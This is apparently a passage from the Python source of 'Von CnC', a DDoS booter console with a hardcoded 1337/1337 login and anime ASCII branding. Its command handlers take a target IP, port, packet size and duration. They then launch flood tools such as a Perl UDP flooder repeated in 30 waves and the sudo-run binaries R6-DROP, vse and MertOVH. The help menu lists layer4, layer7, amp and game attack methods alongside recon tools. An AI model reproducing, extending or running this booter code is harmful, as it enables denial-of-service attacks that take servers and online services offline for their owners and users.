                    print(f"\x1b[38;2;255;0;0m[🔥] home-god: Launching 30 waves on {ip}:{port}\x1b[0m")
                    for i in range(30):
                        print(f"\x1b[38;2;255;170;0m[+] Wave {i+1}/30\x1b[0m")
                        safe_run(f'perl home.pl {ip} {port} {packet_size} {time_sec}')
                        time.sleep(0.3)
                    print(f"\x1b[38;2;0;255;0m[✅] home-god: Completed 30 waves on {ip}:{port}\x1b[0m")
                except IndexError:
                    print(f'Usage: home-god <ip> <port> <packet_size> <time>')
                    print(f'Example: home-god 1.1.1.1 80 1024 50')
    
            # ============================================
            # 🔥 NEW: udp-big (30x home-god attack)
            # ============================================
            elif "udp-big" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    packet_size = cnc.split()[3] if len(cnc.split()) > 3 else "1024"
                    time_sec = cnc.split()[4] if len(cnc.split()) > 4 else "30"
                    print(f"\x1b[38;2;255;0;0m[🔥] UDP-BIG: Launching 30x home-god on {ip}:{port}\x1b[0m")
                    for i in range(30):
                        print(f"\x1b[38;2;255;170;0m[+] Wave {i+1}/30\x1b[0m")
                        safe_run(f'perl home.pl {ip} {port} {packet_size} {time_sec}')
                        time.sleep(0.3)
                    print(f"\x1b[38;2;0;255;0m[✅] UDP-BIG: Completed 30 waves on {ip}:{port}\x1b[0m")
                except IndexError:
                    print(f'Usage: udp-big <ip> <port> <packet_size> <time>')
                    print(f'Example: udp-big 1.1.1.1 80 1024 50')
    
            elif "r6-drop" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    threads = cnc.split()[3]
                    pps = cnc.split()[4]
                    time = cnc.split()[5]
                    safe_run(f'sudo ./R6-DROP {ip} {port} {threads} {pps} {time}')
                except IndexError:
                    print('Usage: r6-drop <ip> <port> <threads> <pps> <time>')
                    print('Example: r6-drop 1.1.1.1 8739 20 50000 30')
    
            elif "vse" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    threads = cnc.split()[3]
                    time = cnc.split()[4]
                    safe_run(f'sudo ./vse {ip} {port} {threads} {time}')
                except IndexError:
                    print('Usage: vse <ip> <port> <threads> <time>')
                    print('Example: vse 1.1.1.1 80 30 50')
    
            elif "ovh-fuck" in cnc:
                try:
                    ip = cnc.split()[1]
                    port = cnc.split()[2]
                    safe_run(f'sudo ./MertOVH {ip} {port}')
                except IndexError:
                    print('Usage: game-crash <ip> <port>')
                    print('Example: game-crash 192.168.0.1 22')
    
            elif "cloudflare-lag" in cnc:
                print('Method "CLOUDFLARE-LAG" not enabled')
    
            elif "help" in cnc:
                print(f'''
                                    -------------------------------------
                            +--------------------------------------------------+
                 +------------------------------------------------------------------------+
                 ║  layer7             ║ L║  amp / game         ║ L ║  tools              ║
                 ║  layer4             ║  ║  rules              ║   ║  cls / clear        ║
                 ║  ports              ║  ║  help               ║   ║                     ║
                 +------------------------------------------------------------------------+
    
                   \x1b[38;2;0;255;255mTools / recon:\x1b[0m geoip, reverseip, reverse-dns, addr-info,
                   subnet-lookup, asn-lookup, dns-lookup, http-headers,
                   traceroute, ping
                   
                   \x1b[38;2;255;0;0m🔥 NEW METHODS:\x1b[0m udp-big (30x home-god)
                   \x1b[38;2;255;170;0m🔄 MODIFIED:\x1b[0m home-god (now attacks 30 times)
                ''')
            else:
                try:
                    cmmnd = cnc.split()[0]
                    print("Command: [ " + cmmnd + " ] Not Found!")
                except IndexError:
                    pass
    except KeyboardInterrupt:
        print("\n\x1b[38;2;0;255;255m[ Bye from Von CnC ]\x1b[0m")
        sys.exit(0)


pink = "\x1b[38;2;255;170;215m"
skin = "\x1b[38;2;245;230;235m"
blush = "\x1b[38;2;255;130;150m"
eye = "\x1b[38;2;130;215;255m"
gold = "\x1b[38;2;255;240;150m"
violet = "\x1b[38;2;190;130;255m"
cyan = "\x1b[38;2;0;255;255m"
reset = "\x1b[0m"


def boot_screen():

    # ═══════════════════════════════════════════════════════════════
    # 🎌 ANIME LOGO (from your provided ASCII art)
    # ═══════════════════════════════════════════════════════════════
    anime_logo = f"""
{cyan}     ⢻⣿⡿⣌⢿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⢀⣠⠄⣠⣶⣿⣿⣿⣿⣿⣿⣟⣠⣾⣿⣿⣿⠟⢡⣿⣿⢿⣟⡣⠞⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⢸⣽⠏⠘⣯⢻⣿⣿⣿⣿⣿⠯⠑⠛⣛⣿⣗⣋⠉⢉⢉⣛⠿⣿⣿⣿⣿⣿⣿⣮⣍⠀⠴⠒⠤⣾⣟⣭⡊⠰⢿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠆⠻⡧⠘⣿⡅⠹⣿⠟⣋⣤⣶⢎⣾⣿⣿⣿⣿⣿⣿⣿⣮⣝⢆⠙⢿⣿⣿⣿⣿⣿⣷⣄⢨⣿⣿⠿⠿⠭⢬⣘⢿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠀⢷⠦⢀⣽⡷⢀⣴⣿⣿⣿⣷⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣦⡢⠹⣮⢻⣿⣿⣿⣿⣧⡉⠿⠷⣶⠄⡀⢘⣿⣿⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠿⣡⣿⣿⢿⣿⣟⣽⣿⣿⣿⣿⣿⣎⣿⣿⣟⣿⣿⣿⣿⣿⣄⢎⠃⢻⣿⣿⣿⣿⣷⡨⣛⠺⠋⠠⠸⠟⣿⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⢀⣾⣿⣿⢏⣿⣿⢹⡏⣿⣿⣿⣿⣿⣿⡸⣿⣿⣮⢿⣿⣿⣿⣟⢧⡣⡀⢻⣿⡿⣿⣿⣷⡸⡗⠀⠀⣼⡿⠋⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡟⡼⣿⠏⣿⣧⣿⣿⣿⣿⠸⣿⡇⠘⢿⣿⣧⡙⣿⣟⣿⣶⡳⣅⠈⣿⣷⢹⣿⣿⣧⠀⡠⢀⡉⠀⢠⣧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠛⣸⡟⢠⢹⣿⢻⣿⣿⣿⣧⢻⣿⡰⣬⡻⣿⣜⣌⠻⣮⡻⣿⣜⢆⠸⣿⡏⣿⣿⣿⡌⣷⠏⠀⠀⡺⣧⠎⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⣰⡟⣼⣿⣿⣿⡟⢠⣿⢁⣿⢸⣿⣽⣿⣿⣿⡌⣇⢻⣧⠻⠘⢙⢫⣭⣧⡐⢦⡲⣭⣥⡁⢿⣯⢹⣿⡞⣇⢑⣀⡔⢸⣧⢻⣿⡜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⣠⣾⡟⣼⣿⣿⣿⣿⡇⣸⠇⣸⡟⡞⡿⡇⢿⣿⣿⣇⠘⡌⢟⡄⣿⣮⡣⠹⣧⣻⣮⡳⢌⢿⣿⣸⣿⠘⣿⡇⣿⠸⢏⣴⣿⣿⠈⣿⢿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⣠⣾⡿⠋⢰⣿⢻⣿⣿⣿⡇⡿⠀⢿⣛⡃⢡⢻⠈⢧⠹⣿⣆⠲⠈⢿⡜⣿⣿⠦⠄⠙⠛⠛⠒⠤⠍⠛⣿⡆⣿⣿⣿⠲⠟⠛⣾⢏⡀⣿⣏⢿⣎⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⣴⡿⠟⠋⠀⠀⣾⣿⣾⣿⠇⣿⠁⣣⢰⣿⣿⣷⡀⢏⢧⠈⣧⠘⢿⣄⠀⠘⠿⠉⢀⡀⠀⠀⠀⠀⠀⢢⣄⠀⢉⣰⣿⣿⣿⡆⠀⠾⣣⢿⢀⠘⣿⢦⢻⣷⢝⢿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡀⣿⠀⣿⣼⣿⡿⠿⠗⣈⢮⡃⠘⢂⠈⠻⢿⡄⢟⢰⣿⣇⣰⡆⠀⠀⣦⢸⣿⠃⢸⣿⣿⣿⢹⠱⢦⡸⢏⡾⢸⠀⠘⠀⡑⣝⢿⣿⣮⣝⢿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⢸⣿⣿⢸⣿⡇⢸⡄⣿⡯⠁⣠⠀⠀⠀⠨⣿⣷⣄⠹⣢⣜⡻⣷⣿⣿⣿⣏⠠⣆⡄⠀⣾⣿⣼⣾⣿⣿⡇⢸⠼⢾⡇⣾⠃⡘⡇⣦⢠⡈⠪⢳⣭⣛⠿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⢸⡇⣿⠘⣿⣇⠈⣧⠻⠁⣸⣿⣀⣤⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠷⠾⣶⠾⠿⠿⡿⢾⣿⣿⡇⢻⢰⠞⡠⠀⠀⣇⣿⣻⣇⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⡄⠀⠀⢸⡇⢹⡆⢻⣿⡆⠘⠄⢄⠸⣿⣿⡏⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣠⡾⣟⣿⡇⣸⣿⣿⣇⣼⢨⠞⠁⢰⡀⣿⢸⢸⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠇⠀⠀⢸⡇⠈⢧⠈⢿⣷⠀⠀⠘⣷⣽⣿⣿⣶⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⠁⣿⣿⣿⠿⣿⠀⠀⡀⢸⡇⢻⣿⡖⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⡇⠀⠀⠀⣧⠀⠈⠆⠈⠻⣧⠱⡄⠸⣿⣫⡔⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⡇⣿⣿⣿⠀⡟⠀⢸⡇⢸⣿⡈⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⢀⠰⣦⡀⣧⣭⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣵⡿⠃⣿⢻⡟⢰⡇⠀⠘⣧⠀⣿⣷⠸⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⢀⡾⠀⣿⣇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣠⠀⣿⣾⡇⢾⠃⠀⠀⣿⢠⢸⣿⣃⢿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠀⡠⢻⣿⡤⣝⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⣠⣾⡿⢰⣇⣿⠸⢹⠀⠀⠀⠸⠘⠀⢛⠉⠈⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿{reset}
{cyan}     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠸⣿⣇⢿⡇⢰⣬⠙⠛⠿⠿⣿⣿⣿⣿⣿⠿⠛⠁⠀⣠⣾⠟⣯⣾⣼⢹⡟⠁⡎⠀⢰⡶⠿⠟⠋⡛⠛⠓⠾⢭⣝⣛⠻⠿⢿⣿⣿⣿⣿⣿{reset}
{reset}"""

    clear()
    print(f"{cyan}[ Von CnC ] {reset}Booting secure console...")
    for i in range(1, 21):
        bar = "\u2588" * i + "\u2591" * (20 - i)
        print(f"\r{cyan}[ {bar} ] {i * 5}%{reset}", end="", flush=True)
        time.sleep(0.04)
    print()
    time.sleep(0.15)

    # عرض اللوغو الأنمي وشاشة تسجيل الدخول
    clear()
    print(anime_logo)
    print("\n" + "="*50)
    print(f"{cyan}        ╔════════════════════════════════════╗{reset}")
    print(f"{cyan}        ║      VON CNC - SECURE CONSOLE    ║{reset}")
    print(f"{cyan}        ║    ⚡ ANIME EDITION ⚡           ║{reset}")
    print(f"{cyan}        ╚════════════════════════════════════╝{reset}")
    print("="*50 + "\n")
    time.sleep(0.3)


def login():
    boot_screen()
    clear()
    user = "1337"
    passwd = "1337"
    username = input(f"{pink}🌸 Username: {reset}")
    password = getpass.getpass(prompt=f'{pink}🔑 Password: {reset}')
    if username != user or password != passwd:
        print("")
        print(f"{pink}💔 Invalid credentials! Abandoning...{reset}")
        sys.exit(1)
    elif username == user and password == passwd:
        print(f"{cyan}✨ Welcome to Von CnC!{reset}")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
